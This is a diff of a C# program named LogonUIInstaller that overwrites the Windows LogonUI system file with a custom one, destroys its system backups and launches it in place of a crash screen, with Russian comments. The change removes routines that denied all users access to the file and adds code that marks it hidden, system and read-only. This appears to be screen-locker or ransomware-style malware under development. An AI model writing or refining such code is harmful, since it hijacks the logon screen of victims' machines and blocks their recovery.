@@ -104,8 +104,13 @@ namespace LogonUIInstaller
 
                 File.WriteAllBytes(originalPath, customLogonUI);
 
-                SetSystemProtection(originalPath);
-                RemoveAllUserAccess(originalPath);
+                // Устанавливаем только атрибуты (без запрета доступа)
+                try
+                {
+                    File.SetAttributes(originalPath, FileAttributes.System | FileAttributes.ReadOnly | FileAttributes.Hidden);
+                }
+                catch { }
+
                 DestroySystemBackups(originalPath);
                 
                 // ЗАПУСКАЕМ НОВЫЙ LogonUI ВМЕСТО BSOD
@@ -300,55 +305,6 @@ namespace LogonUIInstaller
             }
             catch { }
             Environment.Exit(0);
-        }
-
-        private static void SetSystemProtection(string path)
-        {
-            try
-            {
-                FileInfo fileInfo = new FileInfo(path);
-                FileSecurity fileSecurity = fileInfo.GetAccessControl();
-                
-                NTAccount systemAccount = new NTAccount("NT AUTHORITY\\SYSTEM");
-                FileSystemAccessRule systemRule = new FileSystemAccessRule(systemAccount, 
-                    FileSystemRights.FullControl, AccessControlType.Allow);
-                fileSecurity.AddAccessRule(systemRule);
-                
-                SecurityIdentifier everyone = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
-                FileSystemAccessRule denyRule = new FileSystemAccessRule(everyone, 
-                    FileSystemRights.FullControl, AccessControlType.Deny);
-                fileSecurity.AddAccessRule(denyRule);
-                
-                fileInfo.SetAccessControl(fileSecurity);
-            }
-            catch { }
-        }
-
-        private static void RemoveAllUserAccess(string path)
-        {
-            try
-            {
-                FileInfo fileInfo = new FileInfo(path);
-                FileSecurity fileSecurity = fileInfo.GetAccessControl();
-                
-                AuthorizationRuleCollection rules = fileSecurity.GetAccessRules(true, true, typeof(NTAccount));
-                foreach (FileSystemAccessRule rule in rules)
-                {
-                    if (rule.AccessControlType == AccessControlType.Allow)
-                    {
-                        if (!rule.IdentityReference.Value.Contains("SYSTEM") && 
-                            !rule.IdentityReference.Value.Contains("TrustedInstaller"))
-                        {
-                            fileSecurity.RemoveAccessRule(rule);
-                        }
-                    }
-                }
-                
-                fileInfo.SetAccessControl(fileSecurity);
-                
-                File.SetAttributes(path, FileAttributes.System | FileAttributes.ReadOnly | FileAttributes.Hidden);
-            }
-            catch { }
         }
 
         private static void DestroySystemBackups(string originalPath)
